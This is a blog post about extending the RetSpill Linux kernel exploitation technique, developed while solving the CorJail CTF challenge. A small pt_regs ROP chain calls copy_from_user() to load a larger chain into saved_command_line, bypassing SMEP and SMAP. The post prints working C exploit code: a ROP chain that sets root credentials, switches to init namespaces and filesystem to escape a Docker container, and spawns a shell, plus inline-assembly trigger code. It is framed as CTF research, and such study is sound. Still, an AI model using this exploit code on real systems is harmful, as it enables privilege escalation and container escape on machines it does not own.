Making RetSpill More Powerful

July 12, 2026

TL;DR

RetSpill is a kernel exploitation technique in which an attacker turns a Control Flow Hijack into, traditionally, a fairly limited ROP.

In this post I’ll talk about how to turn that limited ROP into unrestricted code execution while bypassing SMEP and SMAP.

Introduction

I was reinforcing my kernel exploitation knowledge by solving old CTF challenges.

I came across CorJail, a challenge where you abuse an Off-By-Null on the Heap to reach a Docker escape.

My approach was quite different from the original writeup. I used the PageJack technique, overflowing a Null-Byte into a pipe_buffer structure to get a UaF on a Physical Page, and then overwriting a seq_operations structure to gain a Control Flow Hijack.

From there I would pivot using RetSpill, a technique I had used in previous challenges to achieve LPE.

The problem is that in this challenge I don’t just need LPE, I need to escape a Docker container. That means I need a bigger ROP Chain than the one I can (at first glance) get with RetSpill.

Recalling RetSpill

RetSpill takes advantage of the fact that the kernel writes user-controlled data from Userland (such as the registers before making a syscall) onto the Stack.

If we have a Control Flow Hijack primitive we can use an add rsp+X; ret gadget to pivot to this portion of the Stack that we control.

The problem is that when pivoting to the pt_regs structure on the Stack (where our registers are saved) we can only write 0x48 bytes (9 registers).

That fell short for escaping a Docker container, since I normally write my ROP Chain across 8 registers and return to userland using the Telefork technique. That ROP Chain would look something like this:

Making RetSpill More Powerful

The bottleneck is clear: I don’t have a write primitive that’s strong enough.

I can’t pivot to a ROP Chain in userland because SMAP is enabled. I also can’t redirect execution to userland because SMEP is enabled too.

I felt like I was banging my head against a wall…

Thinking about how the kernel legally accesses userland data, using copy_from_user(), an idea came to me: what if I make the RetSpill ROP execute a copy_from_user() of my Real ROP into a part of the BSS, and then pivot to it?

And indeed, it could be done in 9 gadgets ;)

Getting to Work

Now all that’s left is to choose which part of the BSS to copy our ROP Chain into. At first I thought of modprobe_path, but it wasn’t big enough for my ROP Chain; at some point it would overwrite other critical structures.

While researching I discovered saved_command_line, a structure in the BSS that stores the command line passed to the kernel at boot. It’s the variable you read through /proc/cmdline. It’s the perfect candidate: the variable has a size of 0x1000 bytes, so you can write a fairly large ROP.

Basically we do something like this:

copy_from_user(saved_command_line, our_buffer, size);
((void (*)(void))saved_command_line)();

void prepare_ropchain(ulong* ropbuf, ulong kern_addr){
  ulong user_rip = (ulong)get_shell;
  int i = 0;
  ropbuf[i++] = kern_addr+POP_RDI;
  ropbuf[i++] = kern_addr+INIT_CRED;
  ropbuf[i++] = kern_addr+COMMIT_CREDS;
 
  ropbuf[i++] = kern_addr+POP_RDI;
  ropbuf[i++] = 1;
  ropbuf[i++] = kern_addr+FIND_TASK_BY_VPID;
  ropbuf[i++] = kern_addr+POP_RDX_RET;
  ropbuf[i++] = 0;
  ropbuf[i++] = kern_addr+MOV_RCX_RAX;
  ropbuf[i++] = kern_addr+MOV_RDI_RCX_SUB_RDI_RDX;
  ropbuf[i++] = kern_addr+POP_RSI;
  ropbuf[i++] = kern_addr+INIT_NSPROXY;
  ropbuf[i++] = kern_addr+SWITCH_NAMESPACES;

  ropbuf[i++] = kern_addr+POP_RDI;
  ropbuf[i++] = kern_addr+INIT_FS;
  ropbuf[i++] = kern_addr+COPY_FS_STRUCT;
  ropbuf[i++] = kern_addr+PUSH_RAX_POP_RBX;
  ropbuf[i++] = kern_addr+POP_RDI;
  ropbuf[i++] = getpid();
  ropbuf[i++] = kern_addr+FIND_TASK_BY_VPID;
  ropbuf[i++] = kern_addr+POP_RSI;
  ropbuf[i++] = 0x6e0;
  ropbuf[i++] = kern_addr+ADD_RAX_RSI_RET;
  ropbuf[i++] = kern_addr+MOV_QWORD_PTR_RAX_RBX_POP_RBX;
  ropbuf[i++] = 0;


  ropbuf[i++] = kern_addr+KPTI_TRAMPOLINE;
  ropbuf[i++] = 0;
  ropbuf[i++] = 0;
  ropbuf[i++] = user_rip;
  ropbuf[i++] = user_cs;
  ropbuf[i++] = user_rflags;
  ropbuf[i++] = user_sp;
  ropbuf[i++] = user_ss;

}

ulong rbp_fake;
void trigger_retspill(int fd, ulong kern_addr){

  ulong ropbuf[33];
  prepare_ropchain(ropbuf, kern_addr);

  // OFFSET TO PT_REGS 0x160

  ulong r9 = kern_addr+ POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET;
  ulong r10 = kern_addr+SAVED_COMMAND_LINE;
  ulong r11 = (ulong)ropbuf;
  ulong r12 = 288;
  rbp_fake = 0x5252525252525252;
  ulong rbx = kern_addr+POP_RCX_RET;
  // Some junk 0x8 data between rbx and r14
  ulong r14 = kern_addr+COPY_FROM_USER;
  ulong r15 = kern_addr+POP_RSP_RET;
  ulong r8 = kern_addr+SAVED_COMMAND_LINE;

  // NOT LOADED INTO PT_REGS
  ulong r13 = 0x4646464646464646;
  ulong rcx = 0x5050505050505050;

  
  char buf[8];
  __asm__ volatile(
      ".intel_syntax noprefix\n"
      "mov [rbp_fake], rbp\n"
      "mov rbp, 0x5252525252525252\n"
      "syscall\n"
      "mov rbp, [rbp_fake]\n"
      ".att_syntax prefix"
      : "+r"(r8), "+r"(r9),"+r"(r10),"+r"(r11),"+r"(r12),"+r"(r13),"+r"(r14),"+r"(r15),
        "+b"(rbx), "+c"(rcx)
      : "D"(fd), "S"(buf), "d"(8), "a"(0)
      : "memory"
      );
}

Conclusion

With this technique we go from having a single Control Flow Hijack to having an arbitrary write and arbitrary code execution primitive.

This opens many doors in Kernel exploitation, since we achieve a very powerful primitive from a single RIP control while bypassing SMEP and SMAP.

(Note: a KASLR leak is required)
